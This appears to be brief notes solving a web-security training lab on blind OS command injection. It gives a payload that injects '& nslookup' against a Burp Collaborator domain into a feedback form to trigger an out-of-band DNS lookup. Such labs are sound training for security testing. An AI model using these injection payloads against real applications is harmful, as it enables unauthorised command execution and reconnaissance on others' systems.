Lab: Blind OS command injection with out-of-band interaction


 This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator. 

Proversion need it

burp collaborator client copy to clipboard and its something such as:

zorh37nyfzjbsg1nog7j9ml6zx5ntc.burpcollaborator.net

then:

 & nslookup zorh37nyfzjbsg1nog7j9ml6zx5ntc.burpcollaborator.net #
